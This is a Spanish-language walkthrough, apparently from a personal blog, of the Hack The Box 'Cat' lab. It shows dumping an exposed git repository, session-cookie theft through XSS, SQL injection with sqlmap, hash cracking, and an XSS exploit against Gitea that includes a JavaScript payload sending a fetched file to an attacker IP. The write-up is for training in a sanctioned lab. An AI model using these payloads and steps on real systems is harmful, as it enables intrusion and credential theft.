---
title: Cat - Hackthebox - Season7
date: 2025-02-07 11:00:00 +0000
layout: post
permalink: /writeups/HTB/LABS/cat-hackthebox
categories: [Labs & CTF, Write Up, Hackthebox]
tags: [Linux, CTF] 
image:
  path: /assets/img/writeups/hackthebox/cat_htb/cabecera.png
  alt: Cat
description: >
  Cat - Hackthebox - Season7 - Guía en español
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Escaneo de puertos

```bash
nmap -p- --open -sV -sC -T4 -Pn 10.10.11.53

Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 21:47 CET
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Best Cat Competition
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.33 seconds
```

Vemos puerto 22 ssh abierto y puerto 80 http abierto.

# Puerto 80 http

![alt text](/assets/img/writeups/hackthebox/cat_htb/image.png)

Vemos una web con un formulario de registro. 
La web parece de ir sobre un concurso de best cats.

Podemos registrarnos, iniciar sesión y subir un gato al concurso y esperar a ver si nos aceptan.

Podríamos intentar subir algun archivo php pero tenemos otra opción más inesperada.

Si nos fijamos en el escaneo de puertos, nmap nos indica que ha encontrado un repositorio git, si navegamos a cat.htb/.git nos indica que no tenemos acceso a ese directorio.

## Git dump

[Git dump](https://github.com/arthaud/git-dumper.git)

```bash
    python3 git_dumper.py http://cat.htb/.git/ ./cat.htb
```

Dentro del directorio cat.htb tenemos toda la estructura de la web.

## Analizando el código fuente

### admin.php

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-1.png)

Vemos como verifica si el usuario que accede a admin.php es "axel" o no. Ya tenemos el nombre de usuario administrador de la web.

### config.php

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-2.png)

En config vemos que existe una base de datos sqlite en /databases/cat.db

### contest.php

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-5.png)

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-3.png)

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-4.png)

En contest.php parece manejar la logica para añadir un nuevo gato al concurso. Lo más interesante puede ser el manejo de la subida de la imagen o los datos del gato pero parece que están bien controlados.

### accept_cat.php

Tras un rato dando vueltas por los archivos encontramos un documento php llamado accept_cat.php que parece tener un parámetro no sanitizado que se sube a la base de datos.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-6.png)

Si intentamos acceder a este archivo directamente, nos da un error de autenticación, por lo que habrá que conseguir alguna forma de acceder a este archivo.

### Acceso a admin.php

Tras un rato investigando las redirecciones y los accesos entre ficheros podemos llegar a la conclusión de que en el panel de admin parecen listarse las solicitudes de subir gatos.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-7.png)

Estas solicitudes pueden aceptarse o rechazarse además de ver los datos del gato que se está subiendo.

Como ya hemos visto el documento que nos interesa es accept_cat.php pero no es accesible por lo que vamos a ver que podemos encontrar en view_cat.php.

#### view_cat.php

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-8.png)

De nuevo revisando el código vemos que el único parámetro que podemos controlar es nuestro nombre de usuario. Los datos del gato son filtrados en el código pero el nombre de usuario no lo es.

# Robo de sesión

Como el documento carga el nombre de usuario en con los datos de gato, podemos crear un usuario con un XSS que nos devuelva la cookie de sesión y luego podemos usar esta cookie para acceder a la web como "axel". 

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-9.png)

Ahora iniciamos sesión con ese usuario y registramos un gato.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-10.png)

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-11.png)

Ahora en el navegador podemos modificar las cookies para tener acceso al admin.php.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-12.png)

Ahora vamos podemos acceder al panel admin.php pero no vemos ninguna petición de aceptar gato, debemos volver a subir un gato.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-13.png)

Bien, ahora necesitamos capturar el paquete de la petición a accept_cat.php y guardarlo en un fichero, lo haremos con Burp Suite.

Interceptamos la petción al darle aceptar al gato y guardamos el paquete en un fichero.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-14.png)

# Dump de la base de datos

Ahora vamos a utilizar esa cookie para poder hacer un dump de la base de datos.

Usamos SQLmap para hacer el dump.

```bash
    sqlmap -r aceptargatos --risk 3 --level 5 --batch --dbms=sqlite --dump --threads 10 -T users --dump
```

Este comando realiza un escaneo de inyección SQL en los parámetros de la petición. Como ya vimos que era potencialmente vulnerable a inyección SQL, indicamos el tipo de riesgo, nivel, tipo de la base de datos, el número de hilos a utilizar, la tabla que queremos extraer y que haga un dump.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-15.png)

Esto va a tardar un rato pero una vez lo tengamos podemos empezar a crackear contraseñas. 

Son MD5 por lo que no es muy dificil, usando jhon y rockyou no tardará mucho.

# Cracking de contraseñas

```bash
    john aceptargatos.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![alt text](/assets/img/writeups/hackthebox/cat_htb/image-16.png)

Cuando tengamos las contraseñas podemos probar si alguna tiene acceso por ssh a cat.htb.

## Acceso a cat.htb

Efectivamente un usuario "rosa" tiene acceso a cat.htb por ssh.

```bash
    ssh rosa@cat.htb
```

Una vez dentro podemos indagar un poco por los directorios y ver que existen tres usuarios; axel, rosa y jobert.
No tenemos acceso.

En mi caso descargué linpeas y lo ejecuté, encontrando ciertos patrones en los archivos de configuración apache que contenían contraseñas.

Hice un filtrado del contenido de access.log en apache y encontré la contraseña de axel.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-17.png)

# User flag

Accedemos por ssh a cat.htb con el usuario axel y la contraseña que encontramos para encontrar el user flag.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-18.png)

Como vemos no tiene tampoco permisos para acceder a jobert.

# Escalado de privilegios

Buscando por los servicios internos encontramos varios interesantes.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-19.png)

Para ver exactamente que són podemos redireccionarlos mediante ssh.

```bash
ssh -L 3000:localhost:3000 25:localhost:25 axel@cat.htb
```

EL puerto 3000 parece ser  gitTea y el puerto 25 es un servidor de correo.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-20.png)

Vemos la versión 1.22.0 de gitTea.

Buscando por exploits encontramos [un exploit, claro](https://www.exploit-db.com/exploits/52077)

Se trata de un ataque sencillo de XSS en la descripción del repositorio git, en la web se explica exactamente como hacerlo.

Antes de nada, vamos a acceder como Axel a gittea, la contraseña es la misma que la que encontramos en el access.log.

## Exploit

Creamos el repositorio git con un documento vacío.

y le añadimos de description un payload XSS.

```html
   <a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.16.67/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">more</a>
```

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-21.png)

Haciendo uso del servidor de correo vamos a enviar mail a jobert@cat.htb con el payload.

```bash
❯ swaks --to "jobert@localhost" --from "axel@localhost" --header "Subject: click link" --body "http://localhost:3000/axel/gold" --server localhost --port 25 --timeout 30s
```

Usando swaks podemos enviar mails desde el servidor de correo redireccionado al puerto 25.

Ahora a la espera de la respuesta en nuestro puerto 80.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-22.png)

Tenemos regalo.

## Descifrando el regalo

La respuesta que tenemos no es otra que el acceso del usuario jobert, administrador del servidor de correo al portal de empleados php.

Es tan sencillo como copiar la respuesta y hacerle un decode de URL.

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-23.png)

Ahora con estas crendecias podemos acceder como root desde el usuario axel.

# Root flag

![alt text](/assets/img/writeups/hackthebox/cat_htb/image-24.png)
